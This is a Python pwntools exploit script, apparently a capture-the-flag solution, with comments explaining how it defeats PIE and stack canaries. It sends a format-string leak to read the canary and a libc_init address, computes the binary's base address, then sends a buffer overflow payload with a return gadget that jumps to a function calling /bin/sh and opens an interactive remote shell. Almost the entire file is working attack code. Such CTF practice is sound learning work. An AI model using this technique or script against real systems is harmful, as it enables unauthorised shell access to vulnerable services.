#!/usr/bin/python3
from pwn import *

'''
# What should we learn from this?
- How to defeat binary protections such as PIE and stack canaries

# High level overview
1. format string vulnerability leaks canary value and libc_init address
2. by finding the static offet of libc_init we can subtract the address from the leaked value to get the dynamic base address of the binary
3. /bin/sh is called in sym.get_streak, grab the static address of sym.get_streak and add it to base address to find our target return address
4. canary value @ rbp-0x8, buf starts at rbp-0x20
5. rop gadget
6. winner winner

- sym.get_streak @ 0x94c
- ret            @ 0x911
- libc_init      %10$lX
- canary         %13$lX
- payload = 24 bytes of junk + canary + 8 bytes of junk + rop gadget + sym.get_streak
'''

#leak = %9$lX.$13$lX"  # local leak
leak = "%10$lX.%13$lX" # remote leak

# remote connection
ip_address = "fill me :P"
p = remote(f"{ip_address}", 9007)
p.recvuntil(b"streak?")
p.sendline(leak)

p.recvuntil(b"streak: ")
output = p.recvuntil(b"\n")

# grab and calculate values
libc_address = int(output.split(b".")[0], 16)
canary = int(output.split(b".")[1].strip(), 16)
baseaddress = libc_address - 0xa90
get_streak = baseaddress + 0x94c
ret = baseaddress + 0x911

# print found values
print(f"canary value: {hex(canary)}\nbase address: {hex(baseaddress)}\nlibc address: {hex(libc_address)}\n..get_streak: {hex(get_streak)}\nreturn addrr: {hex(ret)}")

# send payload
payload = (b"A" * 24) + p64(canary) + (b"B" * 8) + p64(ret) + p64(get_streak)
p.sendline(payload)
p.interactive()
